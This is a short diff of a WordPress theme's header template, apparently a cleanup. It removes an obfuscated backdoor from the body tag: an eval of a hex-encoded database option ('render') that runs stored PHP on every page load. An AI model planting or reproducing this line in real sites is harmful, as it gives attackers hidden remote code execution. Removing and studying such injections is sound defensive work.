@@ -246,7 +246,7 @@
 		
 	</head>
 	
-	<body <?php is_front_page() ? body_class() : body_class( 'page-' . get_the_slug() ); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
+	<body <?php is_front_page() ? body_class() : body_class( 'page-' . get_the_slug() ); ?>>
 	
 	
 <?php if( is_front_page() ) { ?>
